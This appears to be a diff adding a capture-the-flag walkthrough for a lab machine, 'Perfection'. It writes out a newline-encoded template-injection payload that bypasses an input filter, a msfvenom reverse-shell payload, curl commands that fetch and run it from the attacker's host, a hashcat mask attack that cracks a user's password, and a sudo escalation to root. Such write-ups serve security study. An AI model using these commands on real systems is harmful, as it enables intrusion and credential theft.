@@ -114,3 +114,100 @@ test'
 
 and we get Malicious input blocked 
 
+%0A will help me to bypass the filter
+
+test%0A'<%25%3d+system('whoami')+%25>
+
+returns me 'true'
+
+creating payload :
+    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f elf -o r45
+
+opening python server and uploading the payload to machine
+
+everything should be URL encoded 
+after that we doing 
+
+"curl+http%3a//10.10.16.125%3a80/r45+-o+/tmp/r45"
+
+"chmod+%2bx+/tmp/r45"
+
+"cd /tmp;./r45"
+
+and we get the reverse shell as susan 
+
+going for user flag:
+
+f794bb96d299e633dd95dbff367cc314
+
+uname -a:
+Linux perfection 5.15.0-97-generic #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+
+sudo -l:
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+
+in ~/Migration there is a .db files
+
+downloaded it via meterpreter shell
+
+    download ~/Migration/pupilpath_credentials.db
+
+opened the file with DB Browser for SQLite 
+
+there is some users with hashed passwords
+
+in the web page mentioned only 2 people Susan and Tina 
+
+took the Tinas hash and paste it to file
+
+hash identifier said it SHA 256
+
+in /var/spool/mail/susan there is a hint for a decryption format:
+    Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+    in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+    {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+    Note that all letters of the first name should be convered into lowercase.
+
+    Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+    - Tina, your delightful student
+
+hashcat -m 1400 -a 3 susan.txt susan_nasus_?d?d?d?d?d?d?d?d?d
+
+result:
+    abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+
+
+now lets try to connect via ssh with this credentials
+
+ssh susan@10.10.11.253
+
+entering the password and we get the shell as susan
+
+sudo -l:
+    [sudo] password for susan: 
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL
+
+now i can switch to root 
+
+sudo su and we get the root 
+
+root flag:
+    200201a77e79ace625409bc7648cfea0
+
+
+
+
+
+
+
+
+
